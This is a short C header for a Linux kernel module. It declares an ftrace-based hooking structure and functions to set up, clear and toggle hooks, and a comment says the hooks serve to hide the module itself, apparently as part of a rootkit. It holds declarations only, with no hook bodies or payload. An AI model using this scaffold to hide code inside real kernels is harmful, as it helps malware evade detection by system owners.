#ifndef HOOK_H
#define HOOK_H

#include <linux/ftrace.h>
// #include <linux/slab.h>
// #include <linux/uaccess.h>
// #include <linux/linkage.h>

/* *
 * All hooks used by the module to hide itself are controlled from here.
 * */

// Disables ftrace's builtin recursion prevension:
#define OPS                                                                    \
    FTRACE_OPS_FL_SAVE_REGS                                                    \
    | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY

struct hook
{
    const char *name;
    void *hook_func;
    void *orig_func; // orig func so we can call it in our hook

    // don't set these manually:
    unsigned long addr; // symbol addr in kernel memory
    struct ftrace_ops ops;
};

// Hook all the necessary functions:
int setup_hooks(void);

// Unhook all the necessary functions:
int clear_hooks(void);

int toggle_hooks(void);

// get current status
char hook_status(void);

#endif
